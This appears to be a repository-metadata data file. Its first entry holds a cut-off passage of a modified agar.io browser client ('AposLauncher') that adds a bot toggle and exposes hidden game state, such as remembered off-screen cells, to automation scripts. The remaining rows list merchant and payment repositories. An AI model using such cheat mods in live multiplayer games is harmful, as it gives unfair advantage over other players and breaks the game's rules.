""#008080"";                 } else if (dPoints[i][2] == 5) {                     d.fillStyle = ""#FF69B4"";                 } else {                     d.fillStyle = ""#000000"";                 }                  d.fill();                 d.lineWidth = 2;                 d.strokeStyle = \'#003300\';                 d.stroke();             } else {                 var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'), true, (getDarkBool() ? \'#111111\' : \'#F2FBFF\'));                  text.C(dText[i]);                 var textRender = text.L();                 d.drawImage(textRender, dPoints[i][0] - (textRender.width / 2), dPoints[i][1] - (textRender.height / 2));             }          }         d.restore();     }      function drawStats(d) {         d.save()          sessionScore = Math.max(getCurrentScore(), sessionScore);          var botString = window.botList[botIndex].displayText();          var debugStrings = [];         debugStrings.push(""Bot: "" + window.botList[botIndex].name);         debugStrings.push(""Launcher: AposLauncher "" + aposLauncherVersion);         debugStrings.push(""T - Bot: "" + (!toggle ? ""On"" : ""Off""));         debugStrings.push(""R - Lines: "" + (!toggleDraw ? ""On"" : ""Off""));          for (var i = 0; i < botString.length; i++) {             debugStrings.push(botString[i]);         }          debugStrings.push("""");         debugStrings.push(""Best Score: "" + ~~(sessionScore / 100));         debugStrings.push(""Best Time: "" + bestTime + "" seconds"");         debugStrings.push("""");         debugStrings.push(serverIP);          if (getPlayer().length > 0) {             var offsetX = -getMapStartX();             var offsetY = -getMapStartY();             debugStrings.push(""Location: "" + Math.floor(getPlayer()[0].x + offsetX) + "", "" + Math.floor(getPlayer()[0].y + offsetY));         }          var offsetValue = 20;         var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'));          for (var i = 0; i < debugStrings.length; i++) {             text.C(debugStrings[i]);             var textRender = text.L();             d.drawImage(textRender, 20, offsetValue);             offsetValue += textRender.height;         }          if (message.length > 0) {             var mRender = [];             var mWidth = 0;             var mHeight = 0;              for (var i = 0; i < message.length; i++) {                 var mText = new va(28, \'#FF0000\', true, \'#000000\');                 mText.C(message[i]);                 mRender.push(mText.L());                  if (mRender[i].width > mWidth) {                     mWidth = mRender[i].width;                 }                 mHeight += mRender[i].height;             }              var mX = getWidth() / 2 - mWidth / 2;             var mY = 20;              d.globalAlpha = 0.4;             d.fillStyle = \'#000000\';             d.fillRect(mX - 10, mY - 10, mWidth + 20, mHeight + 20);             d.globalAlpha = 1;              var mOffset = mY;             for (var i = 0; i < mRender.length; i++) {                 d.drawImage(mRender[i], getWidth() / 2 - mRender[i].width / 2, mOffset);                 mOffset += mRender[i].height;             }         }          d.restore();     }      function Ab() {         f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"";         f.fillRect(0, 0, m, r);         f.save();         f.strokeStyle = ta ? ""#AAAAAA"" : ""#000000"";         f.globalAlpha = .2 * h;         for (var a = m / h, b = r / h, c = (a / 2 - s) % 50; c < a; c += 50) f.beginPath(), f.moveTo(c * h - .5, 0), f.lineTo(c * h - .5, b * h), f.stroke();         for (c = (b / 2 - t) % 50; c < b; c += 50) f.beginPath(), f.moveTo(0, c * h - .5), f.lineTo(a * h, c * h - .5), f.stroke();         f.restore()     }      function Cb() {         if (Qa && Ja.width) {             var a = m / 5;             f.drawImage(Ja, 5, 5, a, a)         }     }      function Bb() {         for (var a = 0, b = 0; b < k.length; b++) a += k[b].q * k[b].q;         return a     }      function ab() {         z = null;         if (null != A || 0 != F.length)             if (null != A || wa) {                 z = document.createElement(""canvas"");                 var a = z.getContext(""2d""),                     b = 60,                     b = null == A ? b + 24 * F.length : b + 180,                     c = Math.min(200, .3 * m) / 200;                 z.width = 200 * c;                 z.height = b * c;                 a.scale(c, c);                 a.globalAlpha = .4;                 a.fillStyle = ""#000000"";                 a.fillRect(0, 0, 200, b);                 a.globalAlpha =                     1;                 a.fillStyle = ""#FFFFFF"";                 c = null;                 c = Z(""leaderboard"");                 a.font = ""30px Ubuntu"";                 a.fillText(c, 100 - a.measureText(c).width / 2, 40);                 if (null == A)                     for (a.font = ""20px Ubuntu"", b = 0; b < F.length; ++b) c = F[b].name || Z(""unnamed_cell""), wa || (c = Z(""unnamed_cell"")), -1 != M.indexOf(F[b].id) ? (k[0].name && (c = k[0].name), a.fillStyle = ""#FFAAAA"") : a.fillStyle = ""#FFFFFF"", c = b + 1 + "". "" + c, a.fillText(c, 100 - a.measureText(c).width / 2, 70 + 24 * b);                 else                     for (b = c = 0; b < A.length; ++b) {                         var d = c + A[b] * Math.PI * 2;                         a.fillStyle = Db[b + 1];                         a.beginPath();                         a.moveTo(100, 140);                         a.arc(100,                             140, 80, c, d, !1);                         a.fill();                         c = d                     }             }     }      function Ka(a, b, c, d, e) {         this.V = a;         this.x = b;         this.y = c;         this.i = d;         this.b = e     }      function da(a, b, c, d, e, p) {         this.id = a;         this.s = this.x = b;         this.t = this.y = c;         this.r = this.size = d;         this.color = e;         this.a = [];         this.W();         this.B(p)     }      function va(a, b, c, d) {         a && (this.u = a);         b && (this.S = b);         this.U = !!c;         d && (this.v = d)     }      function S(a, b) {         var c = ""1"" == e(""#helloContainer"").attr(""data-has-account-data"");         e(""#helloContainer"").attr(""data-has-account-data"", ""1"");         if (null == b && d.localStorage.loginCache) {             var l = JSON.parse(d.localStorage.loginCache);             l.f = a.f;             l.d = a.d;             l.e = a.e;             d.localStorage.loginCache = JSON.stringify(l)         }         if (c) {             var u = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[0],                 c = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[1].split("" "")[0],                 l = e("".agario-profile-panel .progress-bar-star"").first().text();             if (l != a.e) S({                 f: c,                 d: c,                 e: l             }, function() {                 e("".agario-profile-panel .progress-bar-star"").text(a.e);                 e("".agario-exp-bar .progress-bar"").css(""width"", ""100%"");                 e("".progress-bar-star"").addClass(""animated tada"").one(""webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend"",                     function() {                         e("".progress-bar-star"").removeClass(""animated tada"")                     });                 setTimeout(function() {                     e("".agario-exp-bar .progress-bar-text"").text(a.d + ""/"" + a.d + "" XP"");                     S({                         f: 0,                         d: a.d,                         e: a.e                     }, function() {                         S(a, b)                     })                 }, 1E3)             });             else {                 var p = Date.now(),                     g = function() {                         var c;                         c = (Date.now() - p) / 1E3;                         c = 0 > c ? 0 : 1 < c ? 1 : c;                         c = c * c * (3 - 2 * c);                         e("".agario-exp-bar .progress-bar-text"").text(~~(u + (a.f - u) * c) + ""/"" + a.d + "" XP"");                         e("".agario-exp-bar .progress-bar"").css(""width"", (88 * (u + (a.f - u) * c) / a.d).toFixed(2) + ""%"");                         1 > c ? d.requestAnimationFrame(g) : b && b()                     };                 d.requestAnimationFrame(g)              }         } else e("".agario-profile-panel .progress-bar-star"").text(a.e),             e("".agario-exp-bar .progress-bar-text"").text(a.f + ""/"" + a.d + "" XP""), e("".agario-exp-bar .progress-bar"").css(""width"", (88 * a.f / a.d).toFixed(2) + ""%""), b && b()      }      function jb(a) {         ""string"" == typeof a && (a = JSON.parse(a));         Date.now() + 18E5 > a.ja ? e(""#helloContainer"").attr(""data-logged-in"", ""0"") : (d.localStorage.loginCache = JSON.stringify(a), B = a.fa, e("".agario-profile-name"").text(a.name), $a(), S({             f: a.f,             d: a.d,             e: a.e         }), e(""#helloContainer"").attr(""data-logged-in"", ""1""))     }      function Eb(a) {         a = a.split(""\\n"");         jb({             name: a[0],             ta: a[1],             fa: a[2],             ja: 1E3 *                 +a[3],             e: +a[4],             f: +a[5],             d: +a[6]         });         console.log(""Hello Facebook?"");     }      function La(a) {         if (""connected"" == a.status) {             var b = a.authResponse.accessToken;             d.FB.api(""/me/picture?width=180&height=180"", function(a) {                 d.localStorage.fbPictureCache = a.data.url;                 e("".agario-profile-picture"").attr(""src"", a.data.url)             });             e(""#helloContainer"").attr(""data-logged-in"", ""1"");             null != B ? e.ajax(""https://m.agar.io/checkToken"", {                 error: function() {                     console.log(""Facebook Fail!"");                     B = null;                     La(a)                 },                 success: function(a) {                     a = a.split(""\\n"");                     S({                         e: +a[0],                         f: +a[1],                         d: +a[2]                     });                     console.log(""Facebook connected!"");                 },                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: B             }) : e.ajax(""https://m.agar.io/facebookLogin"", {                 error: function() {                     console.log(""You have a Facebook problem!"");                     B = null;                     e(""#helloContainer"").attr(""data-logged-in"", ""0"")                 },                 success: Eb,                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: b             })         }     }      function Wa(a) {         Y("":party"");         e(""#helloContainer"").attr(""data-party-state"", ""4"");         a = decodeURIComponent(a).replace(/.*#/gim, """");         Ma(""#"" + d.encodeURIComponent(a));         e.ajax(Na + ""//m.agar.io/getToken"", {             error: function() {                 e(""#helloContainer"").attr(""data-party-state"", ""6"")             },             success: function(b) {                 b = b.split(""\\n"");                 e("".partyToken"").val(""agar.io/#"" +                     d.encodeURIComponent(a));                 e(""#helloContainer"").attr(""data-party-state"", ""5"");                 Y("":party"");                 Ca(""ws://"" + b[0], a)             },             dataType: ""text"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: a         })     }      function Ma(a) {         d.history && d.history.replaceState && d.history.replaceState({}, d.document.title, a)     }     if (!d.agarioNoInit) {         var Na = d.location.protocol,             tb = ""https:"" == Na,             xa = d.navigator.userAgent;         if (-1 != xa.indexOf(""Android"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""PlayStore""), setTimeout(function() {                 d.location.href = ""market://details?id=com.miniclip.agar.io""             },             1E3);         else if (-1 != xa.indexOf(""iPhone"") || -1 != xa.indexOf(""iPad"") || -1 != xa.indexOf(""iPod"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""AppStore""), setTimeout(function() {             d.location.href = ""https://itunes.apple.com/app/agar.io/id995999703""         }, 1E3);         else {             var za, f, G, m, r, X = null,                  //UPDATE                 toggle = false,                 toggleDraw = false,                 tempPoint = [0, 0, 1],                 dPoints = [],                 circles = [],                 dArc = [],                 dText = [],                 lines = [],                 names = [""NotReallyABot""],                 originalName = names[Math.floor(Math.random() * names.length)],                 sessionScore = 0,                 serverIP = """",                 interNodes = [],                 lifeTimer = new Date(),                 bestTime = 0,                 botIndex = 0,                 reviving = false,                 message = [],                  q = null,                 s = 0,                 t = 0,                 M = [],                 k = [],                 E = {},                 v = [],                 Q = [],                 F = [],                 fa = 0,                 ga = 0,                  //UPDATE                 ia = -1,                 ja = -1,                  zb = 0,                 C = 0,                 ib = 0,                 K = null,                 pa = 0,                 qa = 0,                 ra = 1E4,                 sa = 1E4,                 h = 1,                 y = null,                 kb = !0,                 wa = !0,                 Oa = !1,                 Ha = !1,                 R = 0,                 ta = !1,                 lb = !1,                 aa = s = ~~((pa + ra) / 2),                 ba = t = ~~((qa + sa) / 2),                 ca = 1,                 P = """",                 A = null,                 ya = !1,                 Ga = !1,                 Ea = 0,                 Fa =                 0,                 na = 0,                 oa = 0,                 mb = 0,                 Db = [""#333333"", ""#FF3333"", ""#33FF33"", ""#3333FF""],                 Ia = !1,                 $ = !1,                 bb = 0,                 B = null,                 J = 1,                 x = 1,                 W = !0,                 Ba = 0,                 Da = {};             (function() {                 var a = d.location.search;                 ""?"" == a.charAt(0) && (a = a.slice(1));                 for (var a = a.split(""&""), b = 0; b < a.length; b++) {                     var c = a[b].split(""="");                     Da[c[0]] = c[1]                 }             })();             var Qa = ""ontouchstart"" in d && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(d.navigator.userAgent),                 Ja = new Image;             Ja.src = ""img/split.png"";             var nb = document.createElement(""canvas"");             if (""undefined"" == typeof console || ""undefined"" ==                 typeof DataView || ""undefined"" == typeof WebSocket || null == nb || null == nb.getContext || null == d.localStorage) alert(""You browser does not support this game, we recommend you to use Firefox to play this"");             else {                 var ka = null;                 d.setNick = function(a) {                     //UPDATE                     originalName = a;                     if (getPlayer().length == 0) {                         lifeTimer = new Date();                     }                      Xa();                     K = a;                     cb();                     R = 0                 };                 d.setRegion = ha;                 d.setSkins = function(a) {                     kb = a                 };                 d.setNames = function(a) {                     wa = a                 };                 d.setDarkTheme = function(a) {                     ta = a                 };                 d.setColors = function(a) {                     Oa = a                 };                 d.setShowMass = function(a) {                     lb = a                 };                 d.spectate = function() {                     K = null;                     H(1);                     Xa()                 };                 d.setGameMode = function(a) {                     a != P && ("":party"" ==                         P && e(""#helloContainer"").attr(""data-party-state"", ""0""), Y(a), "":party"" != a && I())                 };                 d.setAcid = function(a) {                     Ia = a                 };                 null != d.localStorage && (null == d.localStorage.AB9 && (d.localStorage.AB9 = 0 + ~~(100 * Math.random())), mb = +d.localStorage.AB9, d.ABGroup = mb);                 e.get(Na + ""//gc.agar.io"", function(a) {                     var b = a.split("" "");                     a = b[0];                     b = b[1] || """"; - 1 == [""UA""].indexOf(a) && ob.push(""ussr"");                     ea.hasOwnProperty(a) && (""string"" == typeof ea[a] ? y || ha(ea[a]) : ea[a].hasOwnProperty(b) && (y || ha(ea[a][b])))                 }, ""text"");                 d.ga && d.ga(""send"", ""event"", ""User-Agent"", d.navigator.userAgent, {                     nonInteraction: 1                 });                 var la = !1,                     Ya = 0;                 setTimeout(function() {                     la = !0                 }, Math.max(6E4 * Ya, 1E4));                 var ea = {                         AF: ""JP-Tokyo"",                         AX: ""EU-London"",                         AL: ""EU-London"",                         DZ: ""EU-London"",                         AS: ""SG-Singapore"",                         AD: ""EU-London"",                         AO: ""EU-London"",                         AI: ""US-Atlanta"",                         AG: ""US-Atlanta"",                         AR: ""BR-Brazil"",                         AM: ""JP-Tokyo"",                         AW: ""US-Atlanta"",                         AU: ""SG-Singapore"",                         AT: ""EU-London"",                         AZ: ""JP-Tokyo"",                         BS: ""US-Atlanta"",                         BH: ""JP-Tokyo"",                         BD: ""JP-Tokyo"",                         BB: ""US-Atlanta"",                         BY: ""EU-London"",                         BE: ""EU-London"",                         BZ: ""US-Atlanta"",                         BJ: ""EU-London"",                         BM: ""US-Atlanta"",                         BT: ""JP-Tokyo"",                         BO: ""BR-Brazil"",                         BQ: ""US-Atlanta"",                         BA: ""EU-London"",                         BW: ""EU-London"",                         BR: ""BR-Brazil"",                         IO: ""JP-Tokyo"",                         VG: ""US-Atlanta"",                         BN: ""JP-Tokyo"",                         BG: ""EU-London"",                         BF: ""EU-London"",                         BI: ""EU-London"",                         KH: ""JP-Tokyo"",                         CM: ""EU-London"",                         CA: ""US-Atlanta"",                         CV: ""EU-London"",                         KY: ""US-Atlanta"",                         CF: ""EU-London"",                         TD: ""EU-London"",                         CL: ""BR-Brazil"",                         CN: ""CN-China"",                         CX: ""JP-Tokyo"",                         CC: ""JP-Tokyo"",                         CO: ""BR-Brazil"",                         KM: ""EU-London"",                         CD: ""EU-London"",                         CG: ""EU-London"",                         CK: ""SG-Singapore"",                         CR: ""US-Atlanta"",                         CI: ""EU-London"",                         HR: ""EU-London"",                         CU: ""US-Atlanta"",                         CW: ""US-Atlanta"",                         CY: ""JP-Tokyo"",                         CZ: ""EU-London"",                         DK: ""EU-London"",                         DJ: ""EU-London"",                         DM: ""US-Atlanta"",                         DO: ""US-Atlanta"",                         EC: ""BR-Brazil"",                         EG: ""EU-London"",                         SV: ""US-Atlanta"",                         GQ: ""EU-London"",                         ER: ""EU-London"",                         EE: ""EU-London"",                         ET: ""EU-London"",                         FO: ""EU-London"",                         FK: ""BR-Brazil"",                         FJ: ""SG-Singapore"",                         FI: ""EU-London"",                         FR: ""EU-London"",                         GF: ""BR-Brazil"",                         PF: ""SG-Singapore"",                         GA: ""EU-London"",                         GM: ""EU-London"",                         GE: ""JP-Tokyo"",                         DE: ""EU-London"",                         GH: ""EU-London"",                         GI: ""EU-London"",                         GR: ""EU-London"",                         GL: ""US-Atlanta"",                         GD: ""US-Atlanta"",                         GP: ""US-Atlanta"",                         GU: ""SG-Singapore"",                         GT: ""US-Atlanta"",                         GG: ""EU-London"",                         GN: ""EU-London"",                         GW: ""EU-London"",                         GY: ""BR-Brazil"",                         HT: ""US-Atlanta"",                         VA: ""EU-London"",                         HN: ""US-Atlanta"",                         HK: ""JP-Tokyo"",                         HU: ""EU-London"",                         IS: ""EU-London"",                         IN: ""JP-Tokyo"",                         ID: ""JP-Tokyo"",                         IR: ""JP-Tokyo"",                         IQ: ""JP-Tokyo"",                         IE: ""EU-London"",                         IM: ""EU-London"",                         IL: ""JP-Tokyo"",                         IT: ""EU-London"",                         JM: ""US-Atlanta"",                         JP: ""JP-Tokyo"",                         JE: ""EU-London"",                         JO: ""JP-Tokyo"",                         KZ: ""JP-Tokyo"",                         KE: ""EU-London"",                         KI: ""SG-Singapore"",                         KP: ""JP-Tokyo"",                         KR: ""JP-Tokyo"",                         KW: ""JP-Tokyo"",                         KG: ""JP-Tokyo"",                         LA: ""JP-Tokyo"",                         LV: ""EU-London"",                         LB: ""JP-Tokyo"",                         LS: ""EU-London"",                         LR: ""EU-London"",                         LY: ""EU-London"",                         LI: ""EU-London"",                         LT: ""EU-London"",                         LU: ""EU-London"",                         MO: ""JP-Tokyo"",                         MK: ""EU-London"",                         MG: ""EU-London"",                         MW: ""EU-London"",                         MY: ""JP-Tokyo"",                         MV: ""JP-Tokyo"",                         ML: ""EU-London"",                         MT: ""EU-London"",                         MH: ""SG-Singapore"",                         MQ: ""US-Atlanta"",                         MR: ""EU-London"",                         MU: ""EU-London"",                         YT: ""EU-London"",                         MX: ""US-Atlanta"",                         FM: ""SG-Singapore"",                         MD: ""EU-London"",                         MC: ""EU-London"",                         MN: ""JP-Tokyo"",                         ME: ""EU-London"",                         MS: ""US-Atlanta"",                         MA: ""EU-London"",                         MZ: ""EU-London"",                         MM: ""JP-Tokyo"",                         NA: ""EU-London"",                         NR: ""SG-Singapore"",                         NP: ""JP-Tokyo"",                         NL: ""EU-London"",                         NC: ""SG-Singapore"",                         NZ: ""SG-Singapore"",                         NI: ""US-Atlanta"",                         NE: ""EU-London"",                         NG: ""EU-London"",                         NU: ""SG-Singapore"",                         NF: ""SG-Singapore"",                         MP: ""SG-Singapore"",                         NO: ""EU-London"",                         OM: ""JP-Tokyo"",                         PK: ""JP-Tokyo"",                         PW: ""SG-Singapore"",                         PS: ""JP-Tokyo"",                         PA: ""US-Atlanta"",                         PG: ""SG-Singapore"",                         PY: ""BR-Brazil"",                         PE: ""BR-Brazil"",                         PH: ""JP-Tokyo"",                         PN: ""SG-Singapore"",                         PL: ""EU-London"",                         PT: ""EU-London"",                         PR: ""US-Atlanta"",                         QA: ""JP-Tokyo"",                         RE: ""EU-London"",                         RO: ""EU-London"",                         RU: ""RU-Russia"",                         RW: ""EU-London"",                         BL: ""US-Atlanta"",                         SH: ""EU-London"",                         KN: ""US-Atlanta"",                         LC: ""US-Atlanta"",                         MF: ""US-Atlanta"",                         PM: ""US-Atlanta"",                         VC: ""US-Atlanta"",                         WS: ""SG-Singapore"",                         SM: ""EU-London"",                         ST: ""EU-London"",                         SA: ""EU-London"",                         SN: ""EU-London"",                         RS: ""EU-London"",                         SC: ""EU-London"",                         SL: ""EU-London"",                         SG: ""JP-Tokyo"",                         SX: ""US-Atlanta"",                         SK: ""EU-London"",                         SI: ""EU-London"",                         SB: ""SG-Singapore"",                         SO: ""EU-London"",                         ZA: ""EU-London"",                         SS: ""EU-London"",                         ES: ""EU-London"",                         LK: ""JP-Tokyo"",                         SD: ""EU-London"",                         SR: ""BR-Brazil"",                         SJ: ""EU-London"",                         SZ: ""EU-London"",                         SE: ""EU-London"",                         CH: ""EU-London"",                         SY: ""EU-London"",                         TW: ""JP-Tokyo"",                         TJ: ""JP-Tokyo"",                         TZ: ""EU-London"",                         TH: ""JP-Tokyo"",                         TL: ""JP-Tokyo"",                         TG: ""EU-London"",                         TK: ""SG-Singapore"",                         TO: ""SG-Singapore"",                         TT: ""US-Atlanta"",                         TN: ""EU-London"",                         TR: ""TK-Turkey"",                         TM: ""JP-Tokyo"",                         TC: ""US-Atlanta"",                         TV: ""SG-Singapore"",                         UG: ""EU-London"",                         UA: ""EU-London"",                         AE: ""EU-London"",                         GB: ""EU-London"",                         US: ""US-Atlanta"",                         UM: ""SG-Singapore"",                         VI: ""US-Atlanta"",                         UY: ""BR-Brazil"",                         UZ: ""JP-Tokyo"",                         VU: ""SG-Singapore"",                         VE: ""BR-Brazil"",                         VN: ""JP-Tokyo"",                         WF: ""SG-Singapore"",                         EH: ""EU-London"",                         YE: ""JP-Tokyo"",                         ZM: ""EU-London"",                         ZW: ""EU-London""                     },                     L = null;                 d.connect = Ca;                  //UPDATE                 /**                  * Tells you if the game is in Dark mode.                  * @return Boolean for dark mode.                  */                 window.getDarkBool = function() {                     return ta;                 }                  /**                  * Tells you if the mass is shown.                  * @return Boolean for player\'s mass.                  */                 window.getMassBool = function() {                     return lb;                 }                  /**                  * This is a copy of everything that is shown on screen.                  * Normally stuff will time out when off the screen, this                  * memorizes everything that leaves the screen for a little                  * while longer.                  * @return The memory object.                  */                 window.getMemoryCells = function() {                     return interNodes;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCellsArray = function() {                     return v;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCells = function() {                     return E;                 }                  /**                  * Returns an array with all the player\'s cells.                  * @return Player\'s cells                  */                 window.getPlayer = function() {                     return k;                 }                  /**                  * The canvas\' width.                  * @return Integer Width                  */                 window.getWidth = function() {                     return m;                 }                  /**                  * The canvas\' height                  * @return Integer Height                  */                 window.getHeight = function() {                     return r;                 }                  /**                  * Scaling ratio of the canvas. The bigger this ration,                  * the further that you see.                  * @return Screen scaling ratio.                  */                 window.getRatio = function() {                     return h;                 }                  /**                  * [getOffsetX description]                  * @return {[type]} [description]                  */                 window.getOffsetX = function() {                     return aa;                 }                  window.getOffsetY = function() {                     return ba;                 }                  window.getX = function() {                     return s;                 }                  window.getY = function() {                     return t;                 }                  window.getPointX = function() {                     return ia;                 }                  window.getPointY = function() {                     return ja;                 }                  /**                  * The X location of the mouse.                  * @return Integer X                  */                 window.getMouseX = function() {                     return fa;                 }                  /**                  * The Y location of the mouse.                  * @return Integer Y                  */                 window.getMouseY = function() {                     return ga;                 }                  window.getMapStartX = function() {                     return pa;                 }                  window.getMapStartY = function() {                     return qa;                 }                  window.getMapEndX = function() {                     return ra;                 }                  window.getMapEndY = function() {                     return sa;                 }                  window.getScreenDistance = function() {                     var temp = screenDistance();                     return temp;                 }                  /**                  * A timestamp since the last time the server sent any data.                  * @return Last update timestamp                  */                 window.getLastUpdate = function() {                     return C;                 }                  window.getCurrentScore = function() {                     return R;                 }                  /**                  * The game\'s current mode. ("":ffa"", "":experimental"", "":teams"". "":party"")                  * @return {[type]} [description]                  */                 window.getMode = function() {                     return P;                 }                  window.getServer = function() {                     return serverIP;                 }                  window.setPoint = function(x, y) {                     ia = x;                     ja = y;                 }                  window.setScore = function(a) {                     sessionScore = a * 100;                 }                  window.setBestTime = function(a) {                     bestTime = a;                 }                  window.best = function(a, b) {                     setScore(a);                     setBestTime(b);                 }                  window.setBotIndex = function(a) {                     console.log(""Changing bot"");                     botIndex = a;                 }                  window.setMessage = function(a) {                     message = a;                 }                 window.updateBotList = function() {                     window.botList = window.botList || [];                      window.jQuery(\'#locationUnknown\').text("""");                      window.jQuery(\'#locationUnknown\').append(window.jQuery(\'<select id=""bList"" class=""form-control"" onchange=""setBotIndex($(this).val());"" />\'));                     window.jQuery(\'#locationUnknown\').addClass(\'form-group\');                      for (var i = 0; i < w",,3
0,https://github.com/qiulingfeng905/Wish-Merchant-API.git,Wish Merchant API,,2
0,https://github.com/UltraCart/my_account.git,Customer Portal for UltraCart merchants,,2
0,https://github.com/antonsoft0710/iOS_Blockchain_Merchant-App-.git,"iOS, Blockchain, Merchant pro",,2
0,https://github.com/byteball/obyte-merchant.git,Chatbot for a merchant on Byteball network,,2
0,https://github.com/Redacted-Games-LLC/Merchant-Empires.git,A space merchant game of war,,2
0,https://github.com/TeamCommercium/invenstory.git,An inventory management and price tracking tool for amazon merchants.,,2
0,https://github.com/halt-avmc/p24api.git,Privat24 merchant API,,2
0,https://github.com/Bitcoin-com/bip70-merchant-services.git,bip70-merchant-services,,2
0,https://github.com/veritrans/mobile-merchant-server.git,A simple reference implementation for the Mobile SDK merchant server.,,2
0,https://github.com/RazerMS/OpenCart_Plugin.git,Razer Merchant Services OpenCart Shopping Cart Plugin v1.5.0,,2
0,https://github.com/italia/18app-php-sdk.git,PHP SDK for developing merchant applications which accept 18app vouchersÔøº,,2
0,https://github.com/opendns/merchant-esolutions-php.git,"{""PHP Client for Merchant e-Solutions' payment gateway APIs""}",,2
0,https://github.com/nimi0112/PaytmIntegration-Android.git,Paytm sample merchant app for testing purpose only.,,2
0,https://github.com/bitpay/merchant-server-check.git,Server environmental check script to determine if a BitPay merchant has the correct dependencies installed,,2
0,https://github.com/coinsecure/plugins.git,"Coinsecure Programming Libraries for Wallet, Exchange & Merchant",,2
0,https://github.com/yii-dream-team/yii2-platron.git,Platron.ru payment system merchant API,,2
0,https://github.com/WHMCS/sample-remote-input-gateway.git,Sample Remote Input Tokenisation Merchant Payment Gateway Module for WHMCS,,2
0,https://github.com/dapic/spree_offsite_payments.git,"Integrates Shopify Offsite_Payments (extracted the ""billing integration"" code from Active_Merchant) with Spree Commerce",,2
0,https://github.com/COINQVEST/php-merchant-sdk.git,PHP Merchant SDK for COINQVEST. Programmatically accept and settle payments in digital currencies.,"payment-gateway,payment-integration,payment-processing,cryptocurrencies,cryptocurrency,digital-currencies,payment-processor",2
0,https://github.com/RazerMS/Inpage_Checkout.git,Razer Merchant Services Inpage Checkout,,2
0,https://github.com/tokenio/merchant-sample-js.git,Very simple merchant checkout example,,2
0,https://github.com/FahadYousafMahar/Easypay-WHMCS-Gateway.git,üåé [WHMCS Module] üí∞ EasyPay (EasyPaisa) Merchant Gateway for WHMCS,"whmcs-payment-gateway,easypaisa,easypay,whmcs-easypay,whmcs,whmcs-easypaisa-module,whmcs-easypay-module",2
0,https://github.com/channelengine/merchant-api-client-php.git,ChannelEngine Merchant API Client for PHP,,2
0,https://github.com/frozzare/go-swish.git,Go package for the Swish merchant API,"swish,payment",2
0,https://github.com/sahlhoff/merchant-category-codes.git,Merchant Category Codes for credit card transactions.,"credit-card,finance,financial-analysis,credit-card-payments",2
0,https://github.com/Everan-1994/merchants-h5.git,merchants h5,,2
0,https://github.com/ConnecticutDigital/Thomas-Bartram-Digital-Archives.git,"Merchant and shipping account log book manuscript in early 19th century Fairfield, Connecticut",,2
0,https://github.com/cheesefish/happy_merchant.git,Making merchants happy again,,2
0,https://github.com/italia/18app-dotnet-sdk.git,.NET SDK for developing merchant applications which accept 18app vouchers,dotnet,2
0,https://github.com/hayzem/woocommerce-iyzico-plugin.git,Plugin for iyzico payment system with multi-merchant support.,,2
0,https://github.com/italia/18app-python-example.git,Python SDK for developing merchant applications which accept 18app vouchers,python,2
0,https://github.com/RazerMS/Hosted_Payment_for_Shopify_Plugin.git,Hosted Payment for Shopify develop by Razer Merchant Services technical team.,,2
0,https://github.com/COINQVEST/nodejs-merchant-sdk.git,NodeJS Merchant SDK for COINQVEST. Programmatically accept and settle payments in digital currencies.,"cryptocurrency,cryptocurrencies,payment-gateway,payment-integration,payment-processing,payment-processor,digital-currencies",2
0,https://github.com/bitex-coin/merchant-mobile.git,Bitex Crypto Exchange Android Client for Merchants,,2
0,https://github.com/ZzcChen/FiveCrowdsourcing-Merchant.git,FiveCrowdsourcing-Merchant,fivecrowdsourcing-merchant,2
0,https://github.com/Shopify-UK/Shopify-Alipay-Integration.git,Help Shopify UK Merchants Add Alipay Payment Gateway,,2
0,https://github.com/BrianLa0616/Merchants.git,Game that uses merchants to win the game.,,2
0,https://github.com/ish2852/MokiMerchantAPP.git,Merchant App Upload,,2
0,https://github.com/exviva/activemerchant-clickandbuy.git,Active Merchant ClickandBuy gateway,,2
0,https://github.com/LMiceOrg/lmalpha.git,Lmice Merchant for ALPHA,,2
0,https://github.com/samirrayani/metascraper-shopping.git,A custom rule bundle for @microlinkhq/metascraper to get product properties from HTML markup on merchant websites,,2
0,https://github.com/altdg/bulk_mapper.git,Altdg bulk mapping tool for the merchant and domain mapper API https://developer.altdg.com/,,2
0,https://github.com/cennznet/xpay-runtime-tutorial.git,A tutorial to build a merchant payment gateway by using CENNZNet protocols like CENNZX exchange,,2
0,https://github.com/erdbehrmund/privat24.git,Privat 24 merchant API gem,,2
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-a-be.git,merchant-marketplace project for Labspt17,labspt17,2
0,https://github.com/mivaecommerce/readytheme-optics.git,Miva Merchant Optics Ready Theme,,2
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-a-fe.git,merchant-marketplace project for Labspt17,labspt17,2
0,https://github.com/ankulrastogi/xephyr.git,managing merchant payments and transactions,,2
0,https://github.com/kcelestinomaria/Tenderbox.git,Tenderbox is a decentralized tender bidding and product sourcing platform for small businesses and merchants,"nearprotocol,dapp,e-commerce,smart-contracts,rust-lang,react",2
0,https://github.com/BuddaT/MailMerchants.git,Wurm Unlimited server mod to allow trading with merchants remotely via a mailbox,,2
0,https://github.com/matthewcline/DashMap.git,React Native app to display merchants in Colombia who accept Dash currency,,2
0,https://github.com/appoets/omnipay-payubiz.git,PayU Biz payment gateway integration to Laravel for merchants in India.,,2
0,https://github.com/opengento/magento2-document-product-link.git,This module aims to help merchants to link their documents to products in Magento 2.,"php,magento2,magento,magento2-module,magento2-extension,magento-extension,magento-module,magento2-extension-free,magento-2,document-management,attachment,linked-list",2
0,https://github.com/zacbrac/Variant-Based-Reports.git,Variant Based reports for Miva Merchant Stores,,2
